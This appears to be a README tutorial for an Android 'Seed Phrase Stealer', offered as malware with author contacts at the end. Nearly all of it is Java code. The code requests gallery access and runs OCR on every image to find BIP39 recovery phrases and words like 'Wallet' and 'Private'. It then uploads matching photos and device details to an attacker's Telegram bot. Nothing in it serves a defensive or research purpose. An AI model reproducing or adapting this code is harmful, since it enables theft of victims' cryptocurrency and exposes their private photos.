### Android - Seed Phrase Stealer
<img align="left" src="https://github.com/user-attachments/assets/fa2ffcd4-f0bf-4fdc-a312-bc0c41f2d283" width="550" height="500">
Stealer automatically searches for seed phrases in the gallery and is able to find other important data using patterns and keywords. We will use the Google ML Kit library, a powerful and effective tool that will recognize text in images and convert it into a text view that is understandable for analysis.

We will write in Java (A), without the server part, since the log will come directly to Telegram using bot token and user id.

##### 1. Permissions:
First, we need to access the gallery where the seed phrases will be searched. To do this, add to AndroidManifest.xml required permission:
```
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
```
##### 2. Request permission from the user in MainActivity.java:
```
if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
    ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_MEDIA_IMAGES}, REQUEST_PERMISSION_CODE);
} else {
    scanGalleryForImages();
}
```
##### 3. Processing the result of the request:
```
@Override
public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    if (requestCode == REQUEST_PERMISSION_CODE) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            scanGalleryForImages();
        } else {
            Log.e("Permissions", "Access to images is denied");
        }
    }
}
```
I want to emphasize that this method works on newer versions of Android 13, 14. If you want to use the code on older versions (Android 12 and below), then you will need a different permission:
```
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
```
The query logic will remain the same, but with the changed logic of working with images. We will not focus on older versions of Android, but it is worth mentioning for those who will test on Android 12 and below.

##### 4.The main code MainActivity.java:
```
public class MainActivity extends AppCompatActivity {

    private Map<String, String> topicIdMap = new HashMap<>();
    private static final int REQUEST_PERMISSION_CODE = 101;

    private static final String BOT_TOKEN = ""; // Telegram Bot Token
    private static final String CHAT_ID = ""; // ID user Telegram
    private int keywordCount = 10; // How many words from the seed phrases dictionary should match
    private Set<String> keywords = new HashSet<>();
    private int speedMs = 0; // Delay before checking the next image
    private final List<String> specialKeywords = Arrays.asList("Seed", "phrase", "Mnemonic", "Recovery", "Pass", "Backup", "Key", "Master", "Access", "recovery", "seed", "Initial", "Wallet", "Entry", "Security", "Secret", "Private", "Blockchain", "Data", "protection", "Universal", "backup", "System", "Spare");
```

BOT_TOKEN and CHAT_ID need no explanation.
Other parameters:

keywordCount — Determines how many keywords must match to detect the seed phrase. Seed phrases consist of 12-24 words, but only 2048 English words can be part of a BIP39 phrase. We use only English words, as they are the most common.

speedMs is the delay in milliseconds before checking the next image.

specialKeywords is a list of keywords that will be searched in the gallery. If a match is found, the log with the image and keyword will be sent to Telegram.

##### 4.1.Methods:
```
private String getDeviceInfo() {
        String model = Build.MODEL;
        String androidVersion = Build.VERSION.RELEASE;
        return "Device: " + model + ", Android: " + androidVersion;
    }
```
The code transmits brief information about the device - Model,Android version
```
private void loadKeywordsFromFile() {
        try {
            InputStream inputStream = getResources().openRawResource(R.raw.english);
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null) {
                keywords.add(line.trim().toLowerCase());
            }
            reader.close();
        } catch (IOException e) {
            Log.e("Keywords", "kaput", e);
        }
    }
```

The method loads search keywords from a file english.txt (res/raw). These keywords will be used to check the text
recognized using OCR.

The words are added to the keywords collection, which contains all the words that need to be searched in the texts in the images.

##### Now the most interesting thing, the methods for scanning the gallery:
private void scanGalleryForImages() {
        ContentResolver contentResolver = getContentResolver();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA};
        Cursor cursor = contentResolver.query(uri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");

        if (cursor != null) {
            try {
                List<String> imagePaths = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                    imagePaths.add(imagePath);
                }

                processImagesSequentially(imagePaths);
            } finally {
                cursor.close();
            }
        }
    }

##### Responsible for scanning the device's gallery to get a list of images. The query results are sorted by the date of addition and passed to the method for sequential image processing processImagesSequentially.

```
    private void processImagesSequentially(List<String> imagePaths) {
        if (imagePaths.isEmpty()) {
            return;
        }
        String imagePath = imagePaths.remove(0);
        Uri imageUri = Uri.fromFile(new File(imagePath));
        processImageAsync(imageUri);
        
        new android.os.Handler().postDelayed(() -> processImagesSequentially(imagePaths), speedms);
    }
```
This method processes the images one by one with a delay that is set by the speed ms variable.
It extracts the path to the next image from the list and calls the processImageAsync() method to process the image.

(I tried to multi-stream but had some problems with the Google ML Kit)
```
private void processImageAsync(Uri imageUri) {
        Bitmap bitmap = null;
        try {
            bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(imageUri));
            Bitmap resizedBitmap = Bitmap.createScaledBitmap(bitmap, bitmap.getWidth() / 2, bitmap.getHeight() / 2, false);

            recognizeTextFromImage(resizedBitmap, imageUri);
        } catch (IOException e) {
            Log.e("ProcessImage", "Image processing error", e);
        } finally {
            if (bitmap != null && !bitmap.isRecycled()) {
                bitmap.recycle();
            }
        }
    }
```
Loads the image and reduces its size to optimize it for text recognition. This method also manages memory release to prevent memory leaks.

After processing the image, the recognize Text From Image() method is called, which transmits the thumbnail image for analysis using Google ML Kit
Made for optimization.

```
private void recognizeTextFromImage(Bitmap bitmap, Uri imageUri) {
        InputImage image = InputImage.fromBitmap(bitmap, 0);
        TextRecognizer recognizer = TextRecognition.getClient(TextRecognizerOptions.DEFAULT_OPTIONS);

        recognizer.process(image)
                .addOnSuccessListener(result -> {
                    ArrayList<String> englishWords = extractEnglishWords(result);
                    boolean foundSpecialKeyword = checkForSpecialKeywords(englishWords);
                    boolean foundKeyword = checkForKeywords(englishWords);

                    // We send photos to tg only if there are from 12 to 24 words and the keyword is found
                    if (englishWords.size() >= 12 && englishWords.size() <= 24 && foundKeyword) {
                        String deviceInfo = getDeviceInfo();
                        sendPhotoToTelegram(imageUri, englishWords, deviceInfo + ": from 12 to 24 phrases and " + keywordcount + " from the seed phrases dictionary");
                    }


                    if (foundSpecialKeyword) {
                        String keyword = findSpecialKeyword(englishWords);
                        String deviceInfo = getDeviceInfo();
                        sendPhotoToTelegram(imageUri, englishWords, deviceInfo + ": The keyword was found: " + keyword);
                    }
                })
                .addOnFailureListener(e -> Log.e("Text Recognition", "Text recognition error", e));
    }
```

It is responsible for recognizing text in an image using Google ML Kit, analyzes the image, and the result is transmitted to methods for extracting keywords.

In case of successful recognition, the result is analyzed to check for the presence of keywords used in seed phrases.

```
private ArrayList<String> extractEnglishWords(Text result) {
        ArrayList<String> wordsList = new ArrayList<>();
        Pattern pattern = Pattern.compile("[a-zA-Z]+");
        for (Text.TextBlock block : result.getTextBlocks()) {
            Matcher matcher = pattern.matcher(block.getText());
            while (matcher.find()) {
                wordsList.add(matcher.group().toLowerCase());
            }
        }
        return wordsList;
    }
```

The method extracts English words using a regular expression. If you need to work with text in other languages,
you can easily add additional regular expressions to the Pattern object, adapting them to the desired languages.

(As mentioned above, seed phrases in the BIP-39 format may be in other languages)

```
private boolean checkForKeywords(ArrayList<String> words) {
        int keywordCount = 0;
        for (String word : words) {
            if (keywords.contains(word)) {
                Log.d("Keyword Found", "The keyword was found: " + word);
                keywordCount++;
                if (keywordCount >= keywordcount) {
                    return true;
                }
            }
        }
        return false;
    }
```
Checks whether the list of words contains at least one of the keywords from the keywords collection.
If enough keywords are found (determined by the keywordcount variable), the method returns true, which initiates sending data to Telegram.

And finally, sending data to Telegram:

```
private void sendPhotoToTelegram(Uri imageUri, ArrayList<String> words, String caption) {
        try {
            File file = new File(getCacheDir(), "image.jpg");
            Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(imageUri));
            FileOutputStream fos = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fos);
            fos.flush();
            fos.close();

            if (bitmap != null && !bitmap.isRecycled()) {
                bitmap.recycle();
            }

            OkHttpClient client = new OkHttpClient();
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", CHAT_ID)
                    .addFormDataPart("photo", "image.jpg", RequestBody.create(MediaType.parse("image/jpeg"), file))
                    .addFormDataPart("caption", caption)
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new okhttp3.Callback() {
                @Override
                public void onFailure(okhttp3.Call call, IOException e) {
                    Log.e("Telegram", "Error sending the message", e);
                }

                @Override
                public void onResponse(okhttp3.Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        Log.d("Telegram", "good");
                    } else {
                        Log.e("Telegram", "bad: " + response.message());
                    }
                }
            });

        } catch (IOException e) {
            Log.e("Telegram", "errors file send", e);
        }
    }
```
<img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
Contacts:
injectexp.dev / 
pro.injectexp.dev / 
Telegram: @Evi1Grey5 [support]
Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72

















